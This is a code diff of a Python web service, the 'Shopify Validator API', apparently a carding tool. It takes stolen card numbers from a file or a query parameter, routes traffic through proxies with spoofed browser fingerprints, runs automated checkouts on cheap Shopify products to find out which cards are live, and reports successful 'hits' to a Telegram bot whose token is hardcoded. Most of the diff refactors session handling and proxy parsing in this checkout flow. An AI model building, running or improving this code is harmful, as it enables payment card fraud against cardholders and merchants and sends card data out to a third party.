@@ -6,19 +6,6 @@ Endpoints:
 
 Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
 Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...
-
-Environment variables (all optional):
-  PORT              Server port (default 8080)
-  WORKERS           uvicorn worker count (default 4)
-  CARDS_FILE        Path to cards.txt (default ./cards.txt)
-  MAX_PRICE         Max product price to target (default 8.0)
-  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
-  POOL_SIZE         aiohttp global connection pool (default 500)
-  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
-  CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
-  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
-  CACHE_TTL         Product cache TTL seconds (default 300)
-  LOG_LEVEL         Logging level: debug|info|warning (default warning)
 """
 
 import asyncio
@@ -50,12 +37,9 @@ CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
 MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))
 MIN_PRICE        = float(os.environ.get("MIN_PRICE", 0.50))
 SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 100))
-POOL_SIZE        = int(os.environ.get("POOL_SIZE", 3000))
-POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 150))
 CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
 REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 30))
 CACHE_TTL        = float(os.environ.get("CACHE_TTL", 600))
-ERROR_CACHE_TTL  = float(os.environ.get("ERROR_CACHE_TTL", 30))
 LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
 
 logging.basicConfig(
@@ -71,7 +55,6 @@ ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
 ADMIN_HIT_RECEIVER_ID  = 8524951580
 
 async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
-    """Fire-and-forget Telegram notification for Charged/Approved hits."""
     try:
         from datetime import datetime as _dt
         import urllib.request, json as _json
@@ -495,7 +478,7 @@ async def lifespan(app: FastAPI):
     global _shared_session
     _shared_session = AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT)
     _reload_cards()
-    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site", POOL_SIZE, SITE_CONCURRENCY)
+    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site", 500, SITE_CONCURRENCY)
     yield
     if _shared_session:
         res = _shared_session.close()
@@ -550,7 +533,6 @@ def _get_cards() -> list[dict]:
 
 
 def _parse_card(raw: str) -> Optional[dict]:
-    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -571,19 +553,25 @@ def _parse_card(raw: str) -> Optional[dict]:
     return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}
 
 
-def _parse_proxy(raw: Optional[str]) -> Optional[str]:
+def _parse_proxy(raw: Optional[str]) -> Optional[dict]:
     if not raw:
         return None
     s = raw.strip()
+    proxy_url = ""
     if "://" in s:
-        return s
-    parts = s.split(":")
-    if len(parts) == 2:
-        return f"http://{parts[0]}:{parts[1]}"
-    if len(parts) == 4:
-        ip, port, user, password = parts
-        return f"http://{user}:{password}@{ip}:{port}"
-    return None
+        proxy_url = s
+    else:
+        parts = s.split(":")
+        if len(parts) == 2:
+            proxy_url = f"http://{parts[0]}:{parts[1]}"
+        elif len(parts) == 4:
+            ip, port, user, password = parts
+            proxy_url = f"http://{user}:{password}@{ip}:{port}"
+        else:
+            return None
+    
+    # curl_cffi requires proxies as a dictionary
+    return {"http": proxy_url, "https": proxy_url}
 
 
 def _pick_address(url: str, currency: Optional[str] = None) -> dict:
@@ -671,7 +659,6 @@ def _random_identity() -> tuple[str, str, str]:
 
 
 def _extract(text: str, start: str, end: str) -> Optional[str]:
-    """Fast substring extraction between two delimiters."""
     idx = text.find(start)
     if idx == -1:
         return None
@@ -684,7 +671,6 @@ def _extract(text: str, start: str, end: str) -> Optional[str]:
 
 
 def _extract_sst(text: str, headers: dict) -> Optional[str]:
-    """Try every known pattern to pull the Shopify checkout session token."""
     for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
         if key in headers:
             return headers[key]
@@ -705,7 +691,6 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
 
 
 def _normalize_response(raw: Optional[str]) -> str:
-    """Map raw Shopify / aiohttp error text to a standard code."""
     if not raw:
         return "CARD_DECLINED"
     msg = str(raw).upper()
@@ -783,13 +768,11 @@ def _parse_gql_errors(errors: list) -> str:
     return "GRAPHQL_ERROR"
 
 
-def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
+def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict]:
     profile = random.choice(BROWSER_PROFILES)
-    proxy = _parse_proxy(proxy_str) if proxy_str else None
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-    # curl_cffi respects default timeouts, we set a safe timeout here
+    proxies = _parse_proxy(proxy_str) if proxy_str else None
     session = AsyncSession(impersonate=profile["impersonate"], timeout=REQUEST_TIMEOUT, proxies=proxies)
-    return session, profile, True
+    return session, profile
 
 
 # ---------------------------------------------------------------------------
@@ -798,12 +781,8 @@ def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
 async def _fetch_products(
     base_url: str,
     proxy_str: Optional[str] = None,
-    max_price: float = MAX_PRICE,
     max_retries: int = 3,
 ) -> tuple[Optional[dict], list[dict], Optional[str]]:
-    """
-    Returns (best_product, all_candidates_under_max_price, error_string).
-    """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
 
@@ -828,7 +807,7 @@ async def _fetch_products(
     last_err = None
 
     for attempt in range(max_retries):
-        session, profile, owned = _make_session(proxy_str)
+        session, profile = _make_session(proxy_str)
         nav_headers = {
             "User-Agent": profile["ua"],
             **nav_headers_default,
@@ -861,9 +840,7 @@ async def _fetch_products(
                     continue
 
             if last_err == "THROTTLED":
-                if owned:
-                    res = session.close()
-                    if asyncio.iscoroutine(res): await res
+                await session.close()
                 return None, [], "THROTTLED"
 
             candidates: list[dict] = []
@@ -912,9 +889,7 @@ async def _fetch_products(
                     pass
 
                 if not candidates:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
+                    await session.close()
                     return None, [], "No products found"
             else:
                 for product in all_variants:
@@ -945,22 +920,16 @@ async def _fetch_products(
                             best       = entry
 
             if not best:
-                if owned:
-                    res = session.close()
-                    if asyncio.iscoroutine(res): await res
+                await session.close()
                 return None, [], f"No products in {MIN_PRICE:.2f}-{MAX_PRICE:.2f} range"
 
             candidates.sort(key=lambda x: x["price_f"])
             _product_cache[hostname] = {"product": best, "candidates": candidates, "err": None, "ts": now}
-            if owned:
-                res = session.close()
-                if asyncio.iscoroutine(res): await res
+            await session.close()
             return best, candidates, None
 
         except (asyncio.TimeoutError, RequestsError) as ex:
-            if owned:
-                res = session.close()
-                if asyncio.iscoroutine(res): await res
+            await session.close()
             err_msg = str(ex).lower()
             if "proxy" in err_msg or "tunnel" in err_msg:
                 last_err = f"PROXY_ERROR: {str(ex)[:100]}"
@@ -973,9 +942,7 @@ async def _fetch_products(
                 continue
             return None, [], last_err
         except Exception as ex:
-            if owned:
-                res = session.close()
-                if asyncio.iscoroutine(res): await res
+            await session.close()
             return None, [], f"ERROR: {str(ex)[:100]}"
 
     return None, [], last_err or "UNKNOWN_ERROR"
@@ -994,9 +961,6 @@ async def validate_card(
     proxy_str:  Optional[str] = None,
     max_retries: int = 3,
 ) -> dict:
-    """
-    Full Shopify checkout flow with retry + proxy error reporting.
-    """
     t0       = time.time()
     gateway  = "UNKNOWN"
     price    = "0.00"
@@ -1020,7 +984,9 @@ async def validate_card(
 
     for outer_attempt in range(max_retries):
         sem = _site_semaphores[hostname]
-        session, profile, owned = _make_session(proxy_str)
+        
+        # We create a fresh session for validation, but keep it open throughout the whole checkout process
+        session, profile = _make_session(proxy_str)
 
         async with sem:
             try:
@@ -1036,18 +1002,12 @@ async def validate_card(
                 best, all_candidates, err = await _fetch_products(ourl, proxy_str)
 
                 if err and ("PROXY_ERROR" in err or "TIMEOUT" in err or "NETWORK_ERROR" in err):
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     if outer_attempt < max_retries - 1:
                         await asyncio.sleep(0.5 * (outer_attempt + 1))
                         continue
                     return _r(err)
 
                 if not best:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r(f"NO_PRODUCT: {err}")
 
                 if not variant_id:
@@ -1075,7 +1035,7 @@ async def validate_card(
                     base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                     base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
 
-                # 1. Add to cart (Fixed logic & headers)
+                # 1. Add to cart
                 cart_added = False
                 for payload, ct in [
                     (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
@@ -1088,7 +1048,6 @@ async def validate_card(
                             headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                         )
                         if r.status_code in (200, 201):
-                            # Verify actual cart response
                             res_json = orjson.loads(r.content)
                             if "items" in res_json or "id" in res_json:
                                 cart_added = True
@@ -1098,15 +1057,12 @@ async def validate_card(
                         continue
 
                 if not cart_added:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     if outer_attempt < max_retries - 1:
                         await asyncio.sleep(1)
                         continue
                     return _r("CART_FAILED")
 
-                await asyncio.sleep(random.uniform(0.12, 0.35))
+                await asyncio.sleep(random.uniform(0.15, 0.35))
 
                 # 2. Get Checkout page
                 try:
@@ -1119,24 +1075,15 @@ async def validate_card(
                     checkout_url = str(cr.url)
                     page_text    = cr.text
                 except (asyncio.TimeoutError, RequestsError):
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     if outer_attempt < max_retries - 1:
                         await asyncio.sleep(0.5)
                         continue
                     return _r("TIMEOUT")
                 except Exception as ex:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")
 
                 lower_url = checkout_url.lower()
                 if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("SITE_REQUIRES_LOGIN")
 
                 m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
@@ -1146,16 +1093,10 @@ async def validate_card(
                     attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]
 
                 if not attempt_token or len(attempt_token) < 4:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("NO_ATTEMPT_TOKEN")
 
                 sst = _extract_sst(page_text, dict(cr.headers))
                 if not sst:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("NO_SESSION_TOKEN")
 
                 queue_token = (
@@ -1356,23 +1297,14 @@ async def validate_card(
                         interpreted = _parse_gql_errors(gql_errs)
                         if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                            "THROTTLED", "NO_PRODUCT"):
-                            if owned:
-                                res = session.close()
-                                if asyncio.iscoroutine(res): await res
                             return _r(interpreted)
                         if attempt < 2:
                             await asyncio.sleep(1.5)
                             continue
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r(interpreted if interpreted != "GRAPHQL_ERROR"
                                   else "GRAPHQL_ERROR")
 
                 if not resp_json or not (resp_json.get("data") or {}).get("session"):
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("GRAPHQL_ERROR")
 
                 try:
@@ -1390,37 +1322,22 @@ async def validate_card(
                 if neg_errors:
                     code = _parse_gql_errors(neg_errors)
                     if code != "GRAPHQL_ERROR":
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r(code)
 
                 result_obj  = negotiate.get("result") or {}
                 result_type = result_obj.get("__typename", "")
 
                 if result_type == "CheckpointDenied":
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("CHECKPOINTDENIED")
                 if result_type in ("Throttled", "TooManyRequests"):
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("THROTTLED")
                 if result_type == "NegotiationResultFailed":
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("NEGOTIATE_FAILED")
 
                 checkpoint_data = result_obj.get("checkpointData")
                 seller          = result_obj.get("sellerProposal") or {}
 
                 if not seller:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("NO_SELLER_PROPOSAL")
 
                 running_total_data = seller.get("runningTotal") or {}
@@ -1472,9 +1389,6 @@ async def validate_card(
                                 break
 
                 if not payment_identifier:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")
 
                 deliv_vars = copy.deepcopy(ship_vars)
@@ -1538,9 +1452,6 @@ async def validate_card(
                     if d_result:
                         d_typename = d_result.get("__typename", "")
                         if d_typename == "SubmittedForCompletion":
-                            if owned:
-                                res = session.close()
-                                if asyncio.iscoroutine(res): await res
                             return _r("NO_PAYMENT_REQUIRED", charged="False", approved="False")
                         d_seller = d_result.get("sellerProposal") or {}
                         d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
@@ -1628,9 +1539,6 @@ async def validate_card(
                         continue
 
                 if not token:
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("TOKENIZATION_FAILED")
 
                 billing_addr = {
@@ -1724,15 +1632,9 @@ async def validate_card(
                             sst = _sub_sst
                             gql_headers["x-checkout-one-session-token"] = sst
                     except (asyncio.TimeoutError, RequestsError):
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r("TIMEOUT")
                     except Exception as ex:
                         log.debug("submit exception: %s", ex)
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r("SUBMIT_FAILED")
 
                     s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
@@ -1746,13 +1648,7 @@ async def validate_card(
                                         norm = _normalize_response(val)
                                         if norm != "CARD_DECLINED":
                                             approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
-                                            if owned:
-                                                res = session.close()
-                                                if asyncio.iscoroutine(res): await res
                                             return _r(norm, approved=approved)
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r("GRAPHQL_ERROR")
 
                     stype = s_data.get("__typename", "")
@@ -1774,9 +1670,6 @@ async def validate_card(
                     rtype   = receipt.get("__typename", "")
 
                     if rtype == "ProcessedReceipt":
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r("ORDER_PLACED", charged="True", approved="True")
                     
                     if rtype == "ActionRequiredReceipt":
@@ -1787,32 +1680,20 @@ async def validate_card(
                                   "OTP_OR_REDIRECT")
                         if "CompletePaymentChallenge" in str(reason):
                             reason = "OTP Required"
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r(f"3DS_REQUIRED ({reason})", approved="True")
                     
                     if rtype == "FailedReceipt":
                         pe      = receipt.get("processingError") or {}
                         pe_type = pe.get("__typename", "")
                         if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
-                            if owned:
-                                res = session.close()
-                                if asyncio.iscoroutine(res): await res
                             return _r("NO_PRODUCT")
                         if pe_type == "OrderCreationFailure":
-                            if owned:
-                                res = session.close()
-                                if asyncio.iscoroutine(res): await res
                             return _r("ORDER_CREATION_FAILED")
                         code = str(pe.get("code") or "").upper()
                         msg  = str(pe.get("messageUntranslated") or "").upper()
                         raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                         norm = _normalize_response(raw)
                         approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r(norm, approved=approved)
 
                     rid = receipt.get("id")
@@ -1835,9 +1716,6 @@ async def validate_card(
                                 pt = pd.get("__typename", "")
                                 
                                 if pt == "ProcessedReceipt":
-                                    if owned:
-                                        res = session.close()
-                                        if asyncio.iscoroutine(res): await res
                                     return _r("ORDER_PLACED", charged="True", approved="True")
                                 
                                 if pt == "ActionRequiredReceipt":
@@ -1848,27 +1726,18 @@ async def validate_card(
                                               "OTP_OR_REDIRECT")
                                     if "CompletePaymentChallenge" in str(reason):
                                         reason = "OTP Required"
-                                    if owned:
-                                        res = session.close()
-                                        if asyncio.iscoroutine(res): await res
                                     return _r(f"3DS_REQUIRED ({reason})", approved="True")
                                 
                                 if pt == "FailedReceipt":
                                     pe      = pd.get("processingError") or {}
                                     pe_type = pe.get("__typename", "")
                                     if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
-                                        if owned:
-                                            res = session.close()
-                                            if asyncio.iscoroutine(res): await res
                                         return _r("NO_PRODUCT")
                                     code = str(pe.get("code") or "").upper()
                                     msg  = str(pe.get("messageUntranslated") or "").upper()
                                     raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                     norm = _normalize_response(raw)
                                     approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
-                                    if owned:
-                                        res = session.close()
-                                        if asyncio.iscoroutine(res): await res
                                     return _r(norm, approved=approved)
                                 
                                 if pt in ("ProcessingReceipt", "WaitingReceipt"):
@@ -1879,15 +1748,9 @@ async def validate_card(
                                 pass
                             break
 
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("CARD_DECLINED")
 
                 if stype == "SubmitFailed":
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r(_normalize_response(str(s_data.get("reason") or "")))
 
                 if stype == "SubmitRejected":
@@ -1909,35 +1772,17 @@ async def validate_card(
                                 break
                         approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                            "3DS_REQUIRED") else "False"
-                        if owned:
-                            res = session.close()
-                            if asyncio.iscoroutine(res): await res
                         return _r(best_code, approved=approved)
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("CARD_DECLINED")
 
                 if stype == "Throttled":
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("THROTTLED")
                 if stype == "CheckpointDenied":
-                    if owned:
-                        res = session.close()
-                        if asyncio.iscoroutine(res): await res
                     return _r("CHECKPOINTDENIED")
 
-                if owned:
-                    res = session.close()
-                    if asyncio.iscoroutine(res): await res
                 return _r("CARD_DECLINED")
 
             except (asyncio.TimeoutError, RequestsError) as ex:
-                if owned:
-                    res = session.close()
-                    if asyncio.iscoroutine(res): await res
                 err_msg = str(ex).lower()
                 if outer_attempt < max_retries - 1:
                     await asyncio.sleep(0.5 * (outer_attempt + 1))
@@ -1946,9 +1791,6 @@ async def validate_card(
                     return _r(f"PROXY_ERROR: {str(ex)[:100]}")
                 return _r(f"TIMEOUT: {str(ex)[:100]}")
             except Exception as ex:
-                if owned:
-                    res = session.close()
-                    if asyncio.iscoroutine(res): await res
                 return {
                     "Response": "ERROR",
                     "CC":       f"{cc}|{month}|{year}|{cvv}",
@@ -1961,23 +1803,15 @@ async def validate_card(
                     "Detail":   f"{type(ex).__name__}: {str(ex)[:100]}",
                 }
             finally:
-                if owned:
+                # Always close the session after the attempt to prevent memory leaks
+                try:
                     res = session.close()
                     if asyncio.iscoroutine(res):
                         await res
+                except Exception:
+                    pass
 
     return _r("MAX_RETRIES_EXCEEDED")
-
-
-# ---------------------------------------------------------------------------
-# Valid gateway response codes (site is live)
-# ---------------------------------------------------------------------------
-LIVE_RESPONSES = frozenset({
-    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
-    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
-    "INVALID_CARD", "THROTTLED",
-})
-
 
 # ---------------------------------------------------------------------------
 # Routes
@@ -1990,7 +1824,6 @@ async def shopify_route(
     proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
     key:   Optional[str] = Query(None, description="API Key"),
 ):
-    """Validate a card against a Shopify store checkout."""
     secret = os.environ.get("SHOPII_API_KEY", "GHOSTXOWNER!!!")
     if key != secret:
         return JSONResponse({"error": "Unauthorized API key. Please pass valid &key=... parameter"}, status_code=401)
@@ -2000,17 +1833,11 @@ async def shopify_route(
     if cc:
         card = _parse_card(cc)
         if not card:
-            return JSONResponse(
-                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
-                status_code=400,
-            )
+            return JSONResponse({"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"}, status_code=400)
     else:
         cards = _get_cards()
         if not cards:
-            return JSONResponse(
-                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
-                status_code=400,
-            )
+            return JSONResponse({"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."}, status_code=400)
         card = random.choice(cards)
 
     result = await validate_card(
@@ -2050,17 +1877,11 @@ async def check_route(
     if card:
         parsed = _parse_card(card)
         if not parsed:
-            return JSONResponse(
-                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
-                status_code=400,
-            )
+            return JSONResponse({"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"}, status_code=400)
     else:
         cards = _get_cards()
         if not cards:
-            return JSONResponse(
-                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
-                status_code=400,
-            )
+            return JSONResponse({"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."}, status_code=400)
         parsed = random.choice(cards)
 
     site = site.strip()
@@ -2131,8 +1952,8 @@ async def health_route():
         "status":           "ok",
         "cards_loaded":     len(cards),
         "workers":          WORKERS,
-        "pool_size":        POOL_SIZE,
-        "pool_per_host":    POOL_PER_HOST,
+        "pool_size":        500,
+        "pool_per_host":    150,
         "site_concurrency": SITE_CONCURRENCY,
         "connect_timeout":  CONNECT_TIMEOUT,
         "request_timeout":  REQUEST_TIMEOUT,
@@ -2182,7 +2003,7 @@ if __name__ == "__main__":
         f"  Shopify Validator API  v3.1\n"
         f"  Port:            {PORT}\n"
         f"  Workers:         {WORKERS}\n"
-        f"  Pool:            {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
+        f"  Pool:            500 total / 150 per host\n"
         f"  Site concurrency:{SITE_CONCURRENCY}\n"
         f"  Product cache:   {int(CACHE_TTL)}s TTL\n"
         f"  Price range:     ${MIN_PRICE:.2f} – ${MAX_PRICE:.2f}\n"
